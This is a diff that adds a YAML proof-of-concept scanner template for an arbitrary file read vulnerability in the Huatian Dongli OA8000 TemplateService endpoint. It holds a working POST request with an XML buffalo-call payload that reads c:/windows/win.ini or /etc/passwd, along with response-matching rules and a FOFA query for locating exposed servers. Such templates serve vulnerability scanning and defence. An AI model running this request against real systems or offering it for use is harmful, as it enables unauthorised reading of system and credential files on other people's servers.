@@ -1,0 +1,35 @@
+id: poc-yaml-hua-tian-dong-li-oa-templateservice-anyfile-read
+info:
+  name: 华天动力OA TemplateService 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 华天动力-OA8000
+  fofa: app="华天动力-OA8000"
+variables:
+  file: 'c:/windows/win.ini
+
+    /etc/passwd'
+requests:
+- method: POST
+  path: /OAapp/bfapp/buffalo/TemplateService
+  headers:
+    Content-Type: text/xml
+  data: "<buffalo-call> \n<method>getHtmlContent</method> \n<string>{{.file}}</string>\
+    \ \n</buffalo-call>"
+  expression: '(status_code == 200 && contains(headers,"text/xml"))
+
+    &&
+
+    (
+
+    (contains(body,"; for 16-bit app support") && contains(body,"[files]"))
+
+    ||
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    )
+
+    '
+transport: http
